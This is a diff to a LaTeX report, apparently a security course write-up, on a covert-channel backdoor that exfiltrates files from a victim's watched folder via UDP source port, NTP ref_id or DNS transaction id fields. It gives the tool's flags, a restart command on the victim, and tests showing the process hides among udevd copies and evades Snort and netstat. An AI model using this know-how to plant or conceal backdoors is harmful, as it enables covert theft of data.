@@ -29,23 +29,22 @@ Installation is not required, the functionality of the program is controlled by 
 
 To compile the program from source, the libpcap and openssl development libraries will be required.  Building the program from source should be possible with any version of GCC that supports at least the gnu99 C standard using the provided makefile.  Note, the makefile will also set the setuid bit on the resulting executable as the program requires elevated priveleges to open raw sockets.
 
-The available command-line flags are:
--c : Use this option to activate Client mode. This should be used on the attacker's machine.
--s : Use this option to activate Server mode. This should be used on the victim machine.
--h : Use this option to see a short version of the program usage instructions.
--i <arg> : Use this option to specify the remote host that the machine will be communicating with. For the Client, this will be the server's IP. For the Server, this will be the Client's IP.
--w <arg> : Use this option to specify the folder to watch for exfiltration. Any files created or modified in this folder will be sent to the client.
--x <arg> : Use this option to specify the covert channel to use. 'u' for UDP source port, 'n' for NTP ref\_id, 'd' for DNS transaction id.
+The available command-line flags are: \\
+-c : Use this option to activate Client mode. This should be used on the attacker's machine. \\
+-s : Use this option to activate Server mode. This should be used on the victim machine. \\
+-h : Use this option to see a short version of the program usage instructions. \\
+-i [arg] : Use this option to specify the remote host that the machine will be communicating with. For the Client, this will be the server's IP. For the Server, this will be the Client's IP. \\
+-w [arg] : Use this option to specify the folder to watch for exfiltration. Any files created or modified in this folder will be sent to the client. \\
+-x [arg] : Use this option to specify the covert channel to use. 'u' for UDP source port, 'n' for NTP ref\_id, 'd' for DNS transaction id. \\
 
-If you wish to change the watch folder, the easiest way to do this remotely is to use the ps utility to find your covert process on the victim machine and then execute 'kill <process id>; ./bkdoor -s -w <path> -i <ip> ... other options'.
+If you wish to change the watch folder, the easiest way to do this remotely is to use the ps utility to find your covert process on the victim machine and then execute 'kill [process id]; ./bkdoor -s -w [path] -i [ip] ... other options'.
 
 \clearpage
 
 \section{Testing Design}
 
-The majority of the testing will be carried out from the server (victim) side as this is where monitoring.
-The signature for our rootkit is currently ``0xAB" with the data encrypted in the next byte.  The signature
-can also be configured at compile time, which will be harder for analysts and IDS to detect.
+The majority of the testing will be carried out from the server (victim) side as this is where the majority of the monitoring would be done.
+The signature for our rootkit is currently ``0xAB" with the data encrypted in the next byte.  The signature can be changed by modifying a header at compile time, to make it harder for analysts and IDSes to detect.
 \\
 
 \begin{tabularx}{\textwidth}{|c|X|X|X|c|}
@@ -201,6 +200,8 @@ the commands work for all three types of backdoor channel.
   \label{fig:ps}
 \end{figure}
 
+While the process does show up in ps, we can see in the grepped version that there are typically several copies of udevd running on a given linux machine with different process ids, so it would be impossible for an administrator to tell if one was out of place.  
+
 \clearpage
 
 \subsection{Test \# 10 - Network Monitoring - snort}
@@ -213,6 +214,8 @@ the commands work for all three types of backdoor channel.
   \label{fig:snort}
 \end{figure}
 
+Snort was installed with an up to date ruleset and failed to alarm on any of the incoming or outgoing packets as a command was sent from the Client to the Server and then a response was sent from the Server back to the client.  As Snort is limited to the definitions in the installed ruleset, we see the shortcomings of signature based IDS systems all too clearly here.
+
 \clearpage
 
 \subsection{Test \# 11 - Interface Monitoring - netstat}
@@ -224,6 +227,8 @@ the commands work for all three types of backdoor channel.
   \caption{Netstat Monitoring}
   \label{fig:netstat}
 \end{figure}
+
+Here we can see netstat listing the open connections and listening sockets and again, the backdoor is nowhere in sight. This is as expected, as libpcap uses PF\_PACKET sockets internally, which are even lower level than the raw sockets we use elsewhere in the program.
 
 \clearpage
 
